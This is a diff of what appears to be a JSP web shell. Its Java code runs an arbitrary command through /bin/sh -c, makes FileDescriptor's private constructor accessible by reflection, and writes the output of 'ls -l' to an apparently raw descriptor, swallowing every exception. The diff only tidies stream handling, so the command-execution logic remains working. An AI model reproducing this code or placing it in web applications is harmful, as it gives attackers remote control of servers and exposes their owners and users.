@@ -4,18 +4,14 @@
 
     java.util.List<String> list = new java.util.ArrayList<>();
     String[] cmd = new String[]{"/bin/sh", "-c", command };
-    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
-    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
-    java.io.BufferedReader br = new java.io.BufferedReader(isr);
+    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
     String line;
     while ((line = br.readLine()) != null){
         list.add(line);
     }
 
-    br.close();
-    isr.close();
-    in.close();
+	br.close();
 
     java.lang.reflect.Constructor<java.io.FileDescriptor> c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
     c.setAccessible(true);
@@ -25,9 +21,7 @@
 
         try{
             cmd = new String[]{"/bin/sh", "-c", "ls -l" };
-            in = Runtime.getRuntime().exec(cmd).getInputStream();
-            isr  = new java.io.InputStreamReader(in);
-            br = new java.io.BufferedReader(isr);
+            br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
             StringBuilder sb = new StringBuilder();
             while ((line = br.readLine()) != null){
@@ -38,12 +32,7 @@
             os.write(sb.toString().getBytes());
 
             br.close();
-            isr.close();
-            in.close();
-        }catch(Exception e){
-            //pass
-        }
+			os.close();
+        }catch(Exception e){}
     }
 %>
-</body>
-</html>
